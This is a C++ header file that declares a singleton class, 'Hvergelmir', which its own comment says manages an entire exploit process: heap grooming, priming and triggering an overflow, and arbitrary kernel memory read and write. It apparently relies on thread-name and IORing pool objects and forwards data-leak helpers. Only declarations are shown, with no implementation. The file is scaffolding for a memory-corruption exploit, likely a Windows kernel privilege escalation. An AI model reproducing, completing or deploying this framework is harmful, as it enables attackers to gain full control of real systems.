#pragma once

#include "includes.h"
#include "poolObjects.h"
#include "functions.h"
#include "config.h"

#include "threadNameManager.h"
#include "ioRingManager.h"



class Hvergelmir // Singleton Class to manage the entire exploit process, from heap grooming to triggering the overflow and reading/writing memory
{
private:


	bool systemVerified = false;

	ThreadNameManager nameManager;
	IORingManager ioRingManager;

	Hvergelmir(const Hvergelmir&) = delete;
	Hvergelmir& operator=(const Hvergelmir&) = delete;
	Hvergelmir(Hvergelmir&&) = delete;
	Hvergelmir& operator=(Hvergelmir&&) = delete;

	Hvergelmir();

	~Hvergelmir() = default;

public:

	static Hvergelmir& getInstance() {
		static Hvergelmir instance;
		return instance;
	}


	std::function<void(UINT64)> PrimeOverflow;
	std::function<void(BYTE*, UINT64)> TriggerOverflow;
	std::function<void()> PassOverflow;

	bool setOverflowFunctions(std::function<void(UINT64)> iPrimeOverflow, std::function<void(BYTE*, UINT64)> iTriggerOverflow, std::function<void()> iPassOverflow);
	bool VerifySystem();
	bool Exploit();

	bool Read(BYTE* targetAddress, UINT64 sourceAddress, UINT64 size);
	bool Write(UINT64 targetAddress, BYTE* sourceAddress, UINT64 size);

	bool Cleanup();

	// Forwarding helpers for ThreadNameManager used by MemoryBroker
	bool GetDataLeak(UINT64 a, UINT64 b, UINT64 c) { return nameManager.GetDataLeak(a,b,c); }
	BYTE* LeakData() { return nameManager.LeakData(); }
	UINT64 GetLeakSize() { return nameManager.leakSize; }

	
};